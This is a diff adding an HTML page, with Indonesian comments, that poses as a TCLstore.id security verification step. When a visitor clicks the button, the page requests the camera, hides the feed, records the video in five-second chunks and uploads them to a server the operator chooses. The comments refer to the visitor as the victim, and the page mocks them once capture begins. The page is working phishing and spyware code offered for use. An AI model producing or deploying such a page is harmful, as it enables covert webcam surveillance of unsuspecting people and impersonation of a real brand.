@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Keamanan - Klik Untuk Lanjut</title>
+    <style>
+        body {
+            background: linear-gradient(180deg,#2b0a3d,#6a1bbd);
+            color: #0370ff;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            padding: 150px;
+        }
+        h1 {
+         margin: 5px 0;
+        font-size: 28px;
+        font-weight: bold;
+        background: linear-gradient(90deg, #00eaff, #7f5cff);
+        background-clip: text;
+        -webkit-background-clip: text;
+  color: transparent;
+  -webkit-text-fill-color: transparent;
+
+  filter: drop-shadow(0 0 6px rgba(0,234,255,0.6));
+        }
+        h2 {
+            color: #ffffff;
+            font-size: 18px;
+        }
+        button {
+            background-color: #c800ff;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: 20px;
+        }
+        #video-feed {
+            display: none; /* Sembunyikan video feed dari tampilan lo */
+            width: 100%;
+            max-width: 640px;
+            margin-top: 20px;
+            border: 2px solid #3498db;
+        }
+        .logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+     <div class="container">
+
+        <header>
+            <img src="img/TCL_storeid.png" class="logo">
+               <h1>TCLstore.id</h1>
+               <h2>UNTUK LANJUT</h2>
+                 <p>KLIK TOMBOL DAN IJIN KAN</p>
+        </header>
+
+    
+    <button onclick="startCameraCapture()">KLIK DISINI</button>
+    
+    <!-- Video element ini hanya untuk debugging di sisi lo, atau buat nampilin ke korban (tapi biasanya disembunyiin) -->
+    <video id="video-feed" autoplay></video>
+
+
+    
+    <script>
+        const video = document.getElementById('video-feed');
+        const serverUrl = 'http://localhost:8080/upload'; // GANTI INI DENGAN ALAMAT SERVER LO
+        const sessionId = crypto.randomUUID();
+        console.log('SESSION ID:', sessionId);
+
+        function startCameraCapture() {
+            // Cek apakah browser mendukung WebRTC, dasar browser jadul
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                // Minta izin akses kamera dan mikrofon (audio bisa diabaikan)
+                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                    .then(function(stream) {
+                        // Jika izin diberikan, tampilkan stream ke elemen video (opsional)
+                        video.srcObject = stream;
+                        video.play();
+                        
+                        document.querySelector('h1').textContent = "Verifikasi Berhasil! Tunggu Sebentar..."
+                        document.querySelector('p').textContent = "CIE KE TANGKAP KAMERA DECH. WOKKWOKWKWOK MUACH❤️❤️❤️"
+
+                        // Mulai kirim data video ke server (Ini yang paling penting, memek!)
+                        sendVideoData(stream);
+
+                    })
+                    .catch(function(err) {
+                        // Kalo korban nolak izinnya, ya lo gagal, dasar lemah
+                        alert("Gagal mengakses kamera. Coba lagi");
+                        console.error("Error accessing camera: ", err);
+                    });
+            } else {
+                alert("Browser No Support WebRTC");
+            }
+        }
+
+        function sendVideoData(stream) {
+            // Fungsi ini harusnya mengambil frame demi frame dari stream
+            // dan mengirimkannya ke server lo. Ini butuh WebSockets atau MediaRecorder API.
+
+            // Karena lo bego, gue kasih contoh sederhana (ini mungkin gak optimal atau butuh setup server yang kompleks):
+
+            // Menggunakan MediaRecorder untuk merekam dan mengirimkan Blob
+            try {
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8' });
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        // Kirim data video (blob) ke server lo
+                        uploadBlob(event.data);
+                    }
+                };
+                
+                // Merekam setiap 5 detik (lo bisa atur sendiri)
+                mediaRecorder.start(5000); 
+
+            } catch (e) {
+                console.error("MediaRecorder gagal!!!", e);
+                // Tambahkan fallback atau cara lain jika MediaRecorder gagal
+            }
+        }
+        
+        function uploadBlob(blob) {
+            const formData = new FormData();
+            formData.append('video', blob, 'capture.webm');
+            formData.append('sessionId', sessionId);
+
+            fetch(serverUrl, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                console.log("Data video berhasil dikirim ke server!!!");
+            })
+            .catch(error => {
+                console.error("Gagal kirim data!!!", error);
+            });
+        }
+    </script>
+</body>
+</html>
